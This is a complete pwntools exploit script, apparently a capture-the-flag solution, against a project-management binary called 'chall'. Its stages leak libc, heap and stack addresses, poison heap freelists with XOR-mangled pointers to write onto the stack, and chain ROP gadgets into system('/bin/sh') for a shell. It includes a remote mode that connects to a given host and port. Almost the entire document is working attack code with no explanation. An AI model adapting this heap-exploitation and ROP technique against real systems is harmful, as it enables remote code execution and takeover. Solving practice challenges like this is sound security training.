#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
libc = elf.libc

def setup():
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process(elf.path)
        context.terminal = ['tmux', 'splitw', '-h']
        if args.GDB:
            gdb.attach(p, gdbscript='''
            b*createProject+370
            ''')
    
    return p

p = setup()

def register(name, age, username, password, description):
    p.sendlineafter(b'Choose an option: ', b'1')
    p.sendlineafter(b'Enter name: ', name)
    p.sendlineafter(b'Enter age: ', str(age).encode())
    p.sendlineafter(b'Enter username: ', username)
    p.sendlineafter(b'Enter password: ', password)
    p.sendlineafter(b'Enter profile description: ', description)

def login(username, password):
    p.sendlineafter(b'Choose an option: ', b'2')
    p.sendlineafter(b'Enter username: ', username)
    p.sendlineafter(b'Enter password: ', password)

def create_project(description, budget):
    p.sendlineafter(b'Choose an option: ', b'1')
    p.sendlineafter(b'Enter project description: ', description)
    p.sendlineafter(b'Enter project budget: ', str(budget).encode())

def update_project_progress(idx, description, progress):
    p.sendlineafter(b'Choose an option: ', b'4')
    p.sendlineafter(b'Enter project index to update progress: ', str(idx).encode())
    p.sendlineafter(b'New description: ', description.encode())
    p.sendlineafter(b'Enter new progress percentage: ', str(progress).encode())

def leave_a_note(index, note):
    p.sendlineafter(b'Choose an option: ', b'5')
    p.sendlineafter(b'Enter project index to leave a note: ', str(index).encode())
    p.sendlineafter(b'Enter your note: ', note)

def update_profile_description(description):
    p.sendlineafter(b'Choose an option: ', b'7')
    p.sendlineafter(b'Enter new profile description: ', description)

register(b'ks2n', 10, b'komasan', b'komasan', b'A' * 0x500)

# Fill
create_project(b'A' * 0x48, 1000)
create_project(b'B' * 0x48, 1000)
create_project(b'C' * 0x48, 1000)
create_project(b'D' * 0x48, 1000)
create_project(b'E' * 0x48, 1000)
create_project(b'F' * 0x48, 1000)
create_project(b'G' * 0x48, 1000)
create_project(b'H' * 0x48, 1000)

# Leak libc=================================================================

leave_a_note(1, b'SKIBIDII')
p.sendlineafter(b'Choose an option: ', b'6')
p.recvuntil(b'Description: ')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x21ace0
#libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x203b20
success(f'Libc base: {hex(libc.address)}')  

# Leak libc=================================================================


# Leak heap=================================================================

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'ks2n2', 10, b'komasan2', b'komasan2', b'A' * 0x10)

create_project(b'A' * 0x48, 1000)

leave_a_note(1, b'SKIBIDI')
p.sendlineafter(b'Choose an option: ', b'6')
p.recvuntil(b'Description: ')
heapAddr = u64(p.recv(5).ljust(8, b'\x00')) << 12
success(f'Heap addr: {hex(heapAddr)}')

# Leak heap=================================================================


# Leak stack================================================================

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'ks2n3', 10, b'komasan3', b'komasan3', b'A' * 0x98)

create_project(b'A' * 0x68, 1000)
leave_a_note(1, b'A' * 0x98)

update_profile_description(p64((heapAddr + 0x12e0) ^ ((heapAddr >> 12) + 1)))

success(f'Addr: {hex((heapAddr + 0x12e0))}')

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'ks2n4', 10, b'ks2n4', b'ks2n4', b'Z' * 0x68)

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'A' * 8 + p64(libc.sym.environ + 1), 10, b'komasan5', b'komasan5', b'B' * 0x68)
success(f'environ addr: {hex(libc.sym.environ + 1)}')

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
login(b"ks2n4", b"ks2n4")

p.sendlineafter(b'Choose an option: ', b'6')
p.recvuntil(b'Description: ')
stackAddr = (u64(p.recv(5).ljust(8, b'\x00')) << 8) - 0x600 + 0x530 -0x70
success(f'Stack addr: {hex(stackAddr)}')

# Leak stack================================================================

# Overwrite return address==================================================

rop = ROP(libc)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))
ret = rop.find_gadget(['ret'])[0]
system = libc.symbols.system

success(f'system: {hex(system)}')
success(f'bin_sh: {hex(bin_sh)}')
success(f'pop_rdi: {hex(pop_rdi)}')
success(f'ret: {hex(ret)}')

# gadget 1
p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'ks2n7', 10, b'komasan7', b'komasan7', b'A' * 0x98)

create_project(b'A' * 0x68, 1000)
leave_a_note(1, b'A' * 0x98)

update_profile_description(p64((stackAddr + 0x1000 - 0x40) ^ ((heapAddr >> 12) + 1)))

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'ks2n7', 10, b'komasan7', b'komasan7', b'X' * 0x68)

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'ks2n7', 10, b'A' * 24 + p64(pop_rdi)[:6], p64(bin_sh)[:6], b'X' * 0x68)

# create_project(p64(system), 1000)
# gadget 1

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'ks2n8', 10, b'komasan8', b'komasan8', b'A' * 0xb8)

create_project(b'A' * 0x68, 1000)
leave_a_note(1, b'A' * 0xb8)

update_profile_description(p64((stackAddr + 0x1000 + 0x70 - 0x40) ^ ((heapAddr >> 12) + 1)))

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'ks2n8', 10, b'komasan8', b'komasan8', b'X' * 0xb8)

create_project(p64(system)[:6], 1000)

#===

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'ks2n0', 10, b'ks2n0', b'ks2n0', b'z' * 0xb8)

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'ks2n8', 10, b'komasan8', b'komasan8', b'A' * 0xb8)

create_project(b'A' * 0x68, 1000)
leave_a_note(1, b'A' * 0xb8)

update_profile_description(p64((heapAddr + 0x24f0) ^ ((heapAddr >> 12) + 2)))

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'ks2n8', 10, b'komasan8', b'komasan8', b'X' * 0xb8)

create_project(b'A' * 8 + p64(stackAddr + 0x1010)[:6], 1000)

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
login(b'ks2n0', b'ks2n0')
update_profile_description(b'A' * 15)
update_profile_description(b'A' * 8 + p64(ret)[:6])
#===

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'ks2n8', 10, b'komasan8', b'komasan8', b'A' * 0xb8)

create_project(b'A' * 0x68, 1000)
leave_a_note(1, b'A' * 0xb8)

update_profile_description(p64((stackAddr - 0x10) ^ ((heapAddr >> 12) + 2)))

p.sendlineafter(b'Choose an option: ', b'8')    # Logout
register(b'ks2n8', 10, b'komasan8', b'komasan8', b'X' * 0xb8)

add_rsp = rop.find_gadget(['add rsp, 0x1018', 'ret'])[0]
success(f'add_rsp: {hex(add_rsp)}')
create_project(b'H' * 8 + p64(add_rsp)[:6], 1000)

p.sendline(b'ls')

# Overwrite return address==================================================
p.interactive()